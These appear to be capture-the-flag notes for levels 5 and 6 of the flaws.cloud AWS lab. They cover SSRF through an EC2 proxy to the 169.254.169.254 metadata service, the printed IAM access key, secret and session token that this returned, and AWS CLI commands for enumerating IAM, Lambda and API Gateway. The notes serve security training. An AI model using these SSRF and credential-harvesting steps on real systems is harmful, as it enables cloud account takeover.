|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.0. :pushpin: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.1. :pushpin:  Level 5 URL          | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |
| 5.2. :pushpin:  EC2 Metadata Service IP          | `169.254.169.254/`                                                                         |
| 5.3. :pushpin:  EC2 Instance          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.4. :pushpin:  EC2 Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`                                                                         |
| 5.5. :pushpin:  EC2 IAM Credentials Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.6.1 :pushpin:  EC2 Instance Proxy 1         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/latest/meta-data/iam/security-credentials/`                                                                         |
| 5.6.2 :pushpin:  EC2 Instance Proxy 2         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`                                                                         |
| 5.6.3 :pushpin:  EC2 Instance Proxy 3         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/`                                                                         |
| 5.7.1. :pushpin:  EC2 IAM USER          | `flaws`                                                                         |
| 5.7.2. :pushpin:  fLaws Access Key          | `ASIA6GG7PSQGZVHCOSFP`                                                                         |
| 5.7.3. :pushpin:  flaws Secret Key          | `wzAV+fRr2b0/1IdWA5fsFE1HZ9vGMaJCQ2nAuRI+`                                                                         |
| 5.7.4. :pushpin:  flaws Session Token          | `IQoJb3JpZ2luX2VjENT//////////wEaCXVzLXdlc3QtMiJHMEUCICysxf8e25Ao5/bX7HA0OElp5/RnrV8zMCrJwuCup0+VAiEAmc1uLD5e9NbT1px9rBJZEZnWVETMbu6Cn3ZinbkJ6qcquwUIvf//////////ARADGgw5NzU0MjYyNjIwMjkiDGIiCNBVyz80c8UvFCqPBToN3XQ1BlpYWcvCHVp9s9FlhdQZSCz2TGpnbH6i9lDNH+CH0iI3+eq6/GCrQFMN2YtFv4c4joUbFbmvbxv3p4UuG1FeO3bunakS3DzqSBEF2vMNWNKiwRvOOMHstHXBkPDuK2ciHAVzAQ3JaUZEskTq7TXe4gb/i+Epkx0T3NFnX805JflQKqA6YIdHHcR71PdKKvmFxAOhFLZhdvyKYrlf76xxGjirHjXJmNiA8p/PU8ZzsOYTV0Y6kxMVHJGqwVvH4Cng+iBtL+WfponpZRMgHcBvLw0a2mMrX20BjmI7ifJAfZ9bjX90FnFvqccnnEhYjycEbty+mRtLFmDPo0KM2mbgcQWxp+s1uwzAZTI8Ft4xY6UpHDmAF/6kAU1TNUJuuOz1NtAyxwPly6+k5GaayFumsRW4VbUucLTfeQGOBUlwJAtcT2DUg5kMT9QxNz+RAFpch0f0UCGie2LOlYtg5CIbnN1IxgYjNDcp9MPqYGvVB/g5VnIxZQNHjYE65Q4ScYxwV7UIgqHcG9ZHdjRxEc/jivLvrbcqidUpoxwv55YWTpkvENLgxpQPgX98n1Kmv1ycXYVkfbTvfnPqoWz9QKIITbF+inM+oVE2IT/7jQXnnU3USLHV1DUjOxMeYZ+1BzgwQB6nZYUtvMnESVa5R0iI7r+gPOIeNcVFL3HgeD6ZuN0ZGHzDO7TvuNo4R9D+5pUQ8F4jjkZA5ynmCGkwplOlPY0EeYjl4wnAOBhjvrX20MbbPwZ6yXevi5RlkpFWr5Yennp0cXCNxUsf7Nu5EAaYFgD+PpaGRrHBkgGg9GfGQlrUE13bKVLmJsAQOuokwf9aMGc6yj9YlB5SVsjratoon+e9It1/jwb33jMwqrraoQY6sQGUxpVr3JxA1UBSG3lCGGI5seaaSLOlnTT4G03cpBaCd2RxxISOlv3LtXs5bsLCzR2+eHUeulhCn9mH/Q/SDm5ysm7ztt4DJVzqZy+2CZ+yH9aXzOHOmHhQisOboLdj9V3NMQ/9P8ZKeWpVyQSTcEaK3kJ9mkbP7NJSWOnnW1S7r0kSyq2p8v0My/6ge4gtxeZTkzws4nRcS3XIlzoqlDxHGnwDzz/op65TdyGre0bPiQ8=`                                                                         |
| 6.0 :pushpin:  Level 6 URL         | `L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`                                                                         |




<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Final Level 6 -                                                                          -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Final Level 6 -  Final Level 6 Name
<!--*        ------------------------------ -->
### Final Level 6 Prerequisites
1. Full Update
   1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
2. JQ
   1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")
3. AWS CLI installed
   1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
4. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
5. AdministratorAccess Policy Attached to L4Profile
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")


### Final Level 6 Tools
1. [AWS sts](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
   1. [`aws sts get-caller-identity`](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
2. [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html "AWS Lambda")
   1. [`aws lambda list-functions`](https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html "AWS Lambda List Functions")
   2. [`aws lambda invoke`](https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html "AWS Lambda Invoke")
   3. [`aws lambda get-function`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html "AWS Lambda Get Function")
   4. [`aws lambda get-policy`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-policy.html "AWS Lambda Get Policy")
3. [AWS API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html "AWS API Gateway")
   1. [`aws apigateway get-rest-apis`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-rest-apis.html "AWS API Gateway Get Rest APIs")
   2. [`aws apigateaway get-stages`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-stages.html "AWS API Gateway Get Stages")
4. [Linux Text Parsing Tools](https://www.geeksforgeeks.org/linux-text-parsing-tools/ "Linux Text Parsing Tools")
5. [`xargs -I`](https://www.geeksforgeeks.org/xargs-command-in-linux-with-examples/ "xargs Command")
6. [`tr`](https://www.geeksforgeeks.org/tr-command-in-linux-with-examples/ "tr Command")
7.  [`grep`](https://www.geeksforgeeks.org/grep-command-in-linux-unix-with-examples/ "grep Command")
8.  [`cut -d`](https://www.geeksforgeeks.org/cut-command-linux-examples/ "cut Command")
9.  [`sort`](https://www.geeksforgeeks.org/sort-command-linuxunix-examples/ "sort Command")
10. [`uniq`](https://www.geeksforgeeks.org/uniq-command-linux-examples/ "uniq Command")


### Commands Used in Final Level 6
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.0. :pager: Level 6 Title                                                                | Level 6 Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1 :pager: 
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1. :pager:  `./Flaws-Scripts/aws_cli_configure_L6Profile.sh`   | Configure AWS CLI                        |
| 6.2. :pager:  `aws iam get-user --profile $L6_USER --region $AWS_REGION`   |  Get IAM User Info                         |
| 6.3. :pager:  `export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')`   |  Get IAM User Attached Policies                         |  
| 6.4. :pager:  `Flaws-Scripts/aws_iam_full_policies`   |  Get IAM User Attached Policies Full Output                       |  
| 6.5. :pager:  `export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)`   |  Get Level 6 Account ID                      |  
| 6.6. :pager:  `export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')`   |  Get EC2 Lambda Function Name                       |  
| 6.7. :pager:  `export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')`   |  Get EC2 Lambda Function Policy                      |  
| 6.8. :pager:  `export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')`   |  Get EC2 Lambda Function ARN STR                      |  
| 6.9. :pager:  `export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)`   |  Get EC2 Lambda Function API                      |  
| 6.10. :pager:  `export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)`   |  Get EC2 Lambda Function Stage                      |  
| 6.11. :pager:  `export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )`   |  Get EC2 Lambda Function Service                      |  
| 6.12. :pager:  `export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')`   |  Get EC2 Lambda Function Domain                      |  
| 6.13. :pager:  `export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"`   |  Get EC2 Lambda Function Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  











### Important Notes from Final Level 6
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.0. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.1. :pushpin: Level 6 Account Id                 | `975426262029`                                                             |      
| 6.2. :pushpin: IAM Policies                 | `MySecurityAudit:v1, list_apigateaways:v4`                                        |                        
| 6.3. :pushpin: Lambda Function                 | `level5`                                                                |
| 6.4. :pushpin: Lambda Policy                 | `Allow lambda:InvokeFunction using apigateway.amazonaws.com`               |                                                
| 6.5. :pushpin: Lambda Arn                 | `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`           |                                                     
| 6.6. :pushpin: Lambda Final URL                 | `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`                                                                |
| 6.7. :pushpin: Final Level 6 URL                 | `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"`                                                                |

